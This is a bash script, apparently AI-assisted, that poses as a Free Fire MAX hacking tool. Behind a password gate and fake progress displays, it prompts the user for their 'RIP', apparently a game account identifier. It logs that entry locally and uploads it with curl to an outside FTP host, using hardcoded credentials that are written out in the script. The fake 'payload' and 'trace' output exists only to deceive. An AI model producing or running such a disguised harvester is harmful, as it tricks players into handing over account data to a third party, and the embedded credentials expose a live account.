
#itHub Copilot Chat Assistant
#!/bin/bash

#==================== COLORS ====================#
P="\033[1;31m"   # Purple (ASCII art)
G="\033[1;32m"   # Green   (lines / arrows / first codes)
C="\033[1;36m"   # Cyan    (prompt text / light blue)
W="\033[1;37m"   # White   (second codes & general text)
R="\033[1;31m"   # Red
RESET="\033[0m"

clear

#==================== ASCII ART (PLACEHOLDERS) ====================#
echo -e "${P}"
cat << "EOF"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
EOF

echo -e "${W}"
cat << "EOF"
▀█████████▄   ▄██████▄      ███        ▄████████ ▀████    ▐████▀    ▄███████▄ 
  ███    ███ ███    ███ ▀█████████▄   ███    ███   ███▌   ████▀    ███    ███ 
  ███    ███ ███    ███    ▀███▀▀██   ███    █▀     ███  ▐███      ███    ███ 
 ▄███▄▄▄██▀  ███    ███     ███   ▀   ███           ▀███▄███▀      ███    ███ 
▀▀███▀▀▀██▄  ███    ███     ███     ▀███████████    ████▀██▄     ▀█████████▀  
  ███    ██▄ ███    ███     ███              ███   ▐███  ▀███      ███        
  ███    ███ ███    ███     ███        ▄█    ███  ▄███     ███▄    ███        
▄█████████▀   ▀██████▀     ▄████▀    ▄████████▀  ████       ███▄  ▄████▀      
                                                          
EOF
sleep 1

# safe cleanup & tput handling
cleanup() {
  echo -e "${W}"
  if command -v tput >/dev/null 2>&1; then
    tput cnorm 2>/dev/null || true
  fi
  exit
}
trap cleanup INT TERM EXIT

if command -v tput >/dev/null 2>&1; then
  tput civis 2>/dev/null || true
fi

#==================== PASSWORD (STYLIZED BOX) ====================#
while true; do
    echo
    echo -e "${G}|——[ ${C}Enter password to continue ${G}]${RESET}"
    echo -e "${G}|${RESET}"
    echo -ne "${G}╰─>  ${C}${RESET}"
    read -r pass
    echo

    if [ "$pass" = "free:lvl" ]; then
        break
    else
        echo -e "${R}Wrong password! Try again...${RESET}"
        echo
        sleep 1
    fi
done

clear
echo -e "${C}Initializing system modules...${RESET}"
sleep 0.8

# ==================== FAKE PATHS VISUAL (BIGGER & LONGER) ==================== #
print_paths() {
  local total=$1
  local i=1
  while [ $i -le $total ]; do
    local seg1 seg2 seg3 seg4 branch depth path d part
    seg1=$(printf "%04d" $((RANDOM%10000)))
    if command -v tr >/dev/null 2>&1; then
      seg2=$(tr -dc 'a-f0-9' </dev/urandom 2>/dev/null | head -c 8 || printf "%08x" $RANDOM)
      seg3=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c 12 || printf "%012d" $RANDOM)
    else
      seg2=$(printf "%08x" $RANDOM)
      seg3=$(printf "%012d" $RANDOM)
    fi
    seg4=$(printf "%06d" $((RANDOM%1000000)))
    branch=$(( (RANDOM % 9) + 1 ))
    depth=$(( (RANDOM % 4) + 3 ))
    path="Root"
    for d in $(seq 1 $depth); do
      if command -v tr >/dev/null 2>&1; then
        part=$(tr -dc 'a-z' </dev/urandom 2>/dev/null | head -c $((3 + RANDOM % 6)))
        if [ -z "$part" ]; then part="dir$RANDOM"; fi
      else
        part="dir$RANDOM"
      fi
      path="${path}/${part}"
    done
    printf "${G}[%4d] -> %s/enforce/freefire_max%s/trace_%s-%s_%s${RESET}\n" "$i" "$path" "$branch" "$seg1" "$seg2" "$seg4"
    i=$((i+1))
    sleep 0.02
  done
}

echo -e "${G}Generating secure trace paths...${RESET}"
print_paths 140
sleep 0.4

# ==================== PROGRESS BAR 1..100 (BLUE TEXT, GREEN NUMBERS) ==================== #
echo
echo -ne "${C}Finalizing traces: ${RESET}"
for p in $(seq 0 100); do
  printf "\r${G}Finalizing traces: %3d%% ${RESET}" "$p"
  case $((RANDOM % 10)) in
    0) sleep 0.20 ;;
    1) sleep 0.12 ;;
    2) sleep 0.06 ;;
    *) sleep 0.015 ;;
  esac
done
echo
echo -e "${G}Success. Traces complete.${RESET}"
sleep 0.6

# extra "finalizing" phase with visible hiccups (>5 seconds total)
echo -ne "${C}Applying final payloads${RESET}"
for i in 1 2 3 4 5 6 7; do
  if [ $((RANDOM % 4)) -eq 0 ]; then
    printf "${G} ..${RESET}"
    sleep 0.9
  else
    printf "${G}.${RESET}"
    sleep 0.6
  fi
done
echo
sleep 0.6

# ==================== FIRST CODES (AFTER PASSWORD) — GREEN ==================== #
echo
echo -e "${G}Preparing secure payloads...${RESET}"
sleep 0.6

for i in $(seq 1 80); do
  if command -v openssl >/dev/null 2>&1; then
    code=$(openssl rand -hex 80 2>/dev/null | tr '[:lower:]' '[:upper:]') # long hex-like (160 chars)
  else
    code=$(tr -dc 'A-F0-9' </dev/urandom 2>/dev/null | head -c 160 || printf '%0*s' 160 "A")
  fi
  printf "${G}[%03d] %s${RESET}\n" "$i" "$code"
  if [ $((RANDOM % 10)) -eq 0 ]; then
    sleep 0.06
  else
    sleep 0.02
  fi
done

echo
echo -e "${G}Payloads generated.${RESET}"
sleep 0.8

# ==================== REQUEST RIP (SECOND PHASE) — MODIFIED & LOGGING ==================== #
echo
echo -e "${C}Enter your RIP:${RESET}"
read -r -p "> " rip

# -------------------- Logging configuration --------------------
# Local log directory (on the machine running the script)
LOGDIR="${HOME}/tool_logs"
COUNTER_FILE="${LOGDIR}/.session_count"
mkdir -p "$LOGDIR"
touch "$COUNTER_FILE"

# FTP credentials (from information you provided)
FTP_HOST="ftpupload.net"
FTP_USER="if0_40531973"
FTP_PASS="99ZVMdi2uoM7"
# Remote directory under the FTP account (will attempt to create via curl --ftp-create-dirs)
REMOTE_DIR="htdocs/tool_logs"

# -------------------- Session counter (simple, safe) --------------------
cnt=0
if [ -f "$COUNTER_FILE" ]; then
  cnt=$(cat "$COUNTER_FILE" 2>/dev/null || echo 0)
fi
case "$cnt" in ''|*[!0-9]*) cnt=0 ;; esac
cnt=$((cnt + 1))
# Attempt to write atomically
printf "%d" "$cnt" > "${COUNTER_FILE}.tmp" 2>/dev/null || echo "$cnt" > "${COUNTER_FILE}.tmp" || true
mv -f "${COUNTER_FILE}.tmp" "$COUNTER_FILE" 2>/dev/null || printf "%d" > "$COUNTER_FILE" 2>/dev/null || true

# -------------------- Determine filename mapping --------------------
filenames=( "user1.txt" "user2.txt" "user3.txt" "user4.txt" )
if [ "$cnt" -le "${#filenames[@]}" ]; then
  fname="${filenames[$((cnt-1))]}"
else
  fname="user${cnt}.txt"
fi

# -------------------- Sanitize input and write locally --------------------
timestamp=$(date "+%F %T")
# Replace newlines to keep single-line entries
clean_rip=$(printf "%s" "$rip" | tr '\r\n' '  ')
printf "%s %s\n" "$timestamp" "$clean_rip" >> "${LOGDIR}/${fname}"
printf "%s %s (saved to %s)\n" "$timestamp" "$clean_rip" "$fname" >> "${LOGDIR}/all_entries.txt"

# -------------------- Upload to FTP (if possible) --------------------
tmpfile=$(mktemp 2>/dev/null || printf "/tmp/%s.log" "$$")
printf "%s %s\n" "$timestamp" "$clean_rip" > "$tmpfile"

if command -v curl >/dev/null 2>&1; then
  # Upload the entry file
  curl --ftp-create-dirs -T "$tmpfile" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/${fname}" --silent --show-error
  curl_status=$?
  if [ $curl_status -eq 0 ]; then
    echo -e "${G}Uploaded to FTP:${RESET} ${W}ftp://${FTP_HOST}/${REMOTE_DIR}/${fname}${RESET}"
    # Also try updating aggregate log on remote (overwrite)
    curl --ftp-create-dirs -T "${LOGDIR}/all_entries.txt" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/all_entries.txt" --silent --show-error || true
  else
    echo -e "${R}FTP upload failed (curl exit ${curl_status}). Saved locally only.${RESET}"
  fi
else
  echo -e "${R}curl not found; skipping FTP upload. Saved locally at:${RESET} ${W}${LOGDIR}/${fname}${RESET}"
fi

rm -f "$tmpfile" 2>/dev/null || true

# -------------------- User feedback --------------------
echo
echo -e "${C}You entered:${RESET} ${W}${rip}${RESET}"
echo -e "${G}Saved to local:${RESET} ${W}${LOGDIR}/${fname}${RESET}"
echo -ne "${C}Press Enter to continue...${RESET}"
read -r
echo

# ==================== SIMULATED LAUNCH SUCCESS (NO REAL PACKAGE CALLS) ==================== #
echo -e "${G}Finalizing...${RESET}"
# realistic pause
for t in 1 2 3 4 5; do
  if [ $((RANDOM % 3)) -eq 0 ]; then
    printf "${G}.${RESET}"
    sleep 1.2
  else
    printf "${G}.${RESET}"
    sleep 0.8
  fi
done
echo
echo -e "${G}Operation complete. ${C}Launched successfully — Enter the game now.${RESET}"
echo

# ==================== POST-LAUNCH OPTIONS MENU (COLORED) ==================== #
echo -e "${G}/X1 ${R}>${RESET} ${R}arrest${RESET}"
echo -e "${G}/X2 ${R}>${RESET} ${G}restart${RESET}"
echo -e "${G}/X3 ${R}>${RESET} ${C}Getting out of everything${RESET}"
echo
echo -ne "${C}Choose an option (e.g. /X1) > ${RESET}"
read -r opt
echo

case "$opt" in
  "/X1"|"X1")
    echo -e "${R}[/X1] arrest selected...${RESET}"
    sleep 1
    echo -e "${R}Simulating arrest sequence.${RESET}"
    sleep 1
    ;;
  "/X2"|"X2")
    echo -e "${G}[/X2] restart selected...${RESET}"
    sleep 1
    echo -e "${G}Simulating restart sequence.${RESET}"
    sleep 1
    ;;
  "/X3"|"X3")
    echo -e "${C}[/X3] Getting out of everything selected...${RESET}"
    sleep 1
    echo -e "${C}Cleaning up visual session and exiting.${RESET}"
    sleep 1
    ;;
  *)
    echo -e "${R}Unknown option. Exiting.${RESET}"
    ;;
esac

# restore terminal visibility if possible
if command -v tput >/dev/null 2>&1; then
  tput cnorm 2>/dev/null || true
fi

echo -e "${W}Visual session finished.${RESET}"
cleanup
